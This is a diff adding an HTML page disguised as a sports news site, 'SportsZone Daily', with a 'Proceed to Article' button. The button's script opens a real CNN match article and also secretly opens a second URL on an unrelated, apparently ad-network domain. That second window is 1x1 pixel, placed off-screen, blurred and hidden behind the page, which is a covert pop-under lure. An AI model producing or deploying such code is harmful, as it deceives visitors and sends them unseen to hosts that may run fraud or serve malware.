@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SportsZone Daily</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f1f3f6;
+      color: #222;
+    }
+
+    header {
+      background: linear-gradient(135deg, #004aad, #00bfff);
+      color: white;
+      padding: 25px 15px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 26px;
+      font-weight: bold;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-top: 0;
+      color: #004aad;
+    }
+
+    p {
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    .btn-proceed {
+      margin-top: 25px;
+      padding: 14px;
+      width: 100%;
+      font-size: 17px;
+      font-weight: 600;
+      background-color: #00bfff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .btn-proceed:hover {
+      background-color: #e03d00;
+    }
+
+    @media (max-width: 600px) {
+      header h1 {
+        font-size: 22px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+
+      .btn-proceed {
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>🏆 SportsZone Daily</h1>
+  </header>
+
+  <div class="container">
+    <h2>Top Sports Stories</h2>
+    <p>Get the latest scores, highlights, and updates from football, basketball, tennis, and more. Stay in the loop with fast and reliable sports news tailored to fans worldwide.</p>
+
+    <button class="btn-proceed" onclick="proceed()">Proceed to Article</button>
+  </div>
+
+  <script>
+    function proceed() {
+      const link1 = "https://edition.cnn.com/sport/live-news/champions-league-final-inter-milan-psg-05-31-25-spt"; // Main link
+      const link2 = "https://preoccupyray.com/djmi4vcmx?key=e9e5a858ea141d418fa297b2a3e32eaf";     // Background link
+
+      // Open link1 in a new tab
+      window.open(link1, '_blank');
+
+      // Open link2 in background window
+      const bgWindow = window.open(link2, '_blank', 'noopener,noreferrer,width=1,height=1,left=10000,top=10000');
+      if (bgWindow) {
+        bgWindow.blur();
+        window.focus();
+      }
+    }
+  </script>
+
+</body>
+</html>
